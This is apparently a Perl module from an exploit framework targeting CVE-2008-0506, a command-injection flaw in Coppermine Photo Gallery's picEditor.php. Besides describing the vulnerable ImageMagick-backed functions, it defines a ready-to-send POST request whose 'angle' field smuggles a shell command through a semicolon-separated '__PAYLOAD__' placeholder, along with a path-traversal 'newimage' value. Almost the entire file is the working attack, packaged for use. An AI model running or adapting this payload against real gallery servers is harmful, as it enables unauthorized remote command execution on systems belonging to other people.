package MSFExploits::Exploits::COPPERMINE::MSF::CopperminePiceditor;
# use parent qw(MSFExploits::Exploit MSFExploits::Services::COPPERMINE);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

# # use MSFExploits::Functions::Basic;
# # use MSFExploits::Functions::Errors;
# # use MSFExploits::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "CopperminePiceditor";

   my $DETECTION = {

   };

my $EXPLOIT = {
  CVE => "CVE-2008-0506",
  DESCRIPTION => "

        This module exploits a vulnerability in the picEditor.php script of

        Coppermine Photo Gallery versions 1.4.14 and earlier. When configured to

        use the ImageMagick library, the 'quality', 'angle', and 'clipval'

        parameters are not properly escaped before being passed to the PHP

        'exec' command.



        In order to reach the vulnerable 'exec' call, the input must pass

        several validation steps.



        The vulnerabilities actually reside in the following functions:



        image_processor.php: rotate_image(...)

        include/imageObjectIM.class.php: imageObject::cropImage(...)

        include/imageObjectIM.class.php: imageObject::rotateImage(...)

        include/imageObjectIM.class.php: imageObject::resizeImage(...)

        include/picmgmt.inc.php: resize_image(...)



        NOTE: Use of the ImageMagick library is a non-default option. However, a

        user can specify its use at installation time.

      ",
  MSF_MODULE => "coppermine_piceditor",
  OSVDB => 41676,
  REFERENCES => [
    "http://forum.coppermine-gallery.net/index.php?topic=50103.0",
  ],
  TITLE => "Coppermine Photo Gallery picEditor.php Command Execution",


  TYPE => 'MSF',
  PLATFORM => 'UNIX',
  REQUESTS => {
    EXPLOIT2 => {
      METHOD       => 'POST',
      PATH   => 'picEditor.php',
      PAYLOAD      => 'angle=65094%20-quiet%201%202%3b__PAYLOAD__%3b%23&quality=50&newimage=../../images/thumb_private.jpg',
      TEXT   => 'Sending Exploit #2 Request : [POST] /picEditor.php',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;
